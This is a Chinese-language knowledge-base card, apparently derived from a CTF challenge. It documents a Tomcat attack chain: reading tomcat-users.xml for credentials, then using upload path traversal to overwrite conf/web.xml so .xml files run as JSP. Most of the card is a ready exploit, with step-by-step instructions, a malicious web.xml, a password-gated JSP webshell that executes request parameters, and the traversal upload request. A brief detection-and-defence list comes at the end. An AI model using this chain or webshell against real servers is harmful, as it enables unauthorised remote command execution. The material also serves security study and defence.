---
id: web-java-component-tomcat-webxml-jsp-servlet-xml-pattern-webshell
title: Tomcat 上传路径穿越覆盖 conf/web.xml：把 *.xml 映射到 JspServlet，上传含 JSP 代码的 .xml 直接 getshell
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-webxml-jsp-servlet-xml-pattern-webshell
tags:
- java
- tomcat
- file-upload
- path-traversal
- webxml
- jsp-servlet
- webshell
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V276
  verified_at: '2026-11-08T00:55:31+08:00'
  notes: 已对照原文与 8 张图核对：img02 读 conf/tomcat-users.xml（admin/manager-gui）、img03 上传 poc.xml 到 uploads、img04 覆盖前 .xml 被浏览器按 XML 解析报错、img05 覆盖后 /myapp/uploads/lll.xml?pwd=111&i=cat ... 回显 DASCTF flag，链路完整证明。已修正 one-liner 穿越层级与 6 级一致、把『仅拒绝 .jsp』改为原文可证的『只放行 .xml』、并把 conf/web.xml 生效条件改为『重启或上下文重载（原文未说明）』。dup-scan pair 0（vs 14879 的 WEB-INF/web.xml + jsp-file 卡，duplicate, cosine 0.9715）裁决为并列保留：写不同 web.xml、前置写权限/落盘目录/PoC 均不同，且 14878 走通的 conf 路径在 14879 卡中标注为未走通，属互补而非同一链，不删除。
url: /docs/web/java/component/tomcat/web-java-component-tomcat-webxml-jsp-servlet-xml-pattern-webshell/
draft: false
kb_aliases:
- tomtom2
- web.xml 覆盖
- '*.xml 映射 JspServlet'
- XML 上传 getshell
- tomcat-users.xml 读口令
---

## 一句话结论

Tomcat 应用提供仅允许 `.xml` 的任意路径上传时，可先读 `conf/tomcat-users.xml` 获取后台口令登录，再用 `path=../../../../../../opt/tomcat/conf` 覆盖 `conf/web.xml`，把 `<url-pattern>*.xml</url-pattern>` 映射到 `org.apache.jasper.servlet.JspServlet`；之后上传扩展名为 `.xml`、内容为 JSP scriptlet 的一句话文件到可访问目录，访问该文件即被 JSP 引擎编译执行，完成 getshell。

## 原理

- 信息收集：页面提供 `/env`、`/read` 等功能，可读环境变量与文件；Tomcat 明文账号在 `conf/tomcat-users.xml`，读出 `admin`/口令后登录后台/上传页。
- 上传接口把 `path` 参数直接拼到上传根目录，未阻止 `../`；Tomcat 以解压目录部署时 `conf/` 对应用进程可写，覆盖 `conf/web.xml` 后需让 Tomcat 重新读取全局描述符（重启或上下文重载；原文未说明具体触发方式）。
- 默认 `web.xml` 只把 `*.jsp`/`*.jspx` 映射给 JspServlet；攻击者把 `*.xml` 加入 JspServlet 的 mapping，Tomcat 收到 `.xml` 请求时不再按静态文件返回，而是交给 Jasper 编译文件内容。JSP 编译只看内容，不看扩展名。
- 上传接口只放行 `.xml`（无法上传 `.jsp`），因此同一上传功能既能改配置又能落地 JSP 内容。
- 重启/重载后 `GET /myapp/uploads/lll.xml?pwd=111&i=cat /flag` 由 JspServlet 执行 scriptlet 返回命令输出。

## 触发条件

- Tomcat exploded 部署，`conf/web.xml` 可写；上下文会因描述符变更自动重载（autoDeploy/reloadable 或重启）。
- 上传功能可控制目标目录（path 参数）且存在 `../` 穿越，文件名可控；上传接口只放行 `.xml`、拒绝 `.jsp`。
- 能读到 `conf/tomcat-users.xml` 或获得上传入口凭据。
- JspServlet 未被禁用。

## 利用步骤

1. 读环境变量、`/read` 等接口收集路径；读 `conf/tomcat-users.xml` 拿账号口令并登录上传页。
2. 上传路径穿越：`POST /myapp/upload?path=../../../../../../opt/tomcat/conf`，filename=`web.xml`，内容把 `*.xml` 映射到 JspServlet。
3. 上传 JSP 一句话，filename 用 `.xml`（如 `lll.xml`），放到 web 可访问目录（如 `uploads`）。
4. 访问 `/myapp/uploads/lll.xml?pwd=111&i=<cmd>` 执行命令。

## PoC

恶意 `web.xml`：

```xml
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee" version="3.1">
  <servlet>
    <servlet-name>jsp</servlet-name>
    <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
  </servlet>
  <servlet-mapping>
    <servlet-name>jsp</servlet-name>
    <url-pattern>*.xml</url-pattern>
  </servlet-mapping>
</web-app>
```

`lll.xml`：

```jsp
<%
if("111".equals(request.getParameter("pwd"))){
  java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
  int a=-1; byte[] b=new byte[2048]; out.print("<pre>");
  while((a=in.read(b))!=-1){ out.println(new String(b)); }
  out.print("</pre>");
}
%>
```

```http
POST /myapp/upload?path=../../../../../../opt/tomcat/conf HTTP/1.1
Content-Type: multipart/form-data; boundary=X

--X
Content-Disposition: form-data; name="file"; filename="web.xml"

<恶意 web.xml>
--X--
```

## 变体与关联

- 也可用 `<jsp-file>` 将 `WEB-INF/tmp/myshell.xml` 注册为 servlet（需能写 WEB-INF）；本链用 `*.xml` 全局映射，落地位置更自由。
- 关联 Tomcat PUT 写 JSP、Digester webshell、Context docBase 篡改等。
- 边界：WAR 部署重新解压覆盖、conf 只读、上传路径规范化、autoDeploy 关闭且未重启时失效。

## 检测与防御

- 上传目录固定、文件名服务端生成、禁止 path 参数控制目录；校验 realpath。
- `conf/` 对运行用户只读，使用不可变制品部署；关闭 autoDeploy；删除 manager 或强口令。
- 监控 web.xml 修改、JspServlet 新增非 jsp 后缀 mapping、非常规扩展名被 Jasper 编译。
